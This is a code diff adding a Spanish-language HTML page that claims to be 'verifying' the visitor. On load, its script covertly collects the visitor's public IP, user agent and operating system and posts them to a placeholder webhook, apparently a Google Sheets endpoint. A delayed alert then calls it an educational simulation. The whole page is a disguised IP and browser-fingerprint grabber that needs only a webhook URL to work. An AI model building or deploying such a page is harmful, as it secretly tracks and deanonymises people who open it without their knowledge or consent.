@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Verificando...</title>
+</head>
+<body>
+  <h1>Verificando...</h1>
+  <p>Por favor, espere...</p>
+
+  <script>
+    async function obtenerDatos() {
+      const userAgent = navigator.userAgent;
+      const platform = navigator.platform;
+
+      // Obtener IP pública
+      const res = await fetch("https://api.ipify.org?format=json");
+      const data = await res.json();
+      const ip = data.ip;
+
+      // Enviar datos al Google Sheets
+      const webhook = "TU_WEBHOOK_AQUI"; // <-- Reemplaza esto
+
+      fetch(webhook, {
+        method: "POST",
+        mode: "no-cors",
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        body: `ip=${ip}&browser=${encodeURIComponent(userAgent)}&os=${encodeURIComponent(platform)}`
+      });
+
+      // Opcional: mostrar mensaje o redirigir
+      setTimeout(() => {
+        alert("Simulación educativa completada.");
+      }, 3000);
+    }
+
+    obtenerDatos();
+  </script>
+</body>
+</html>
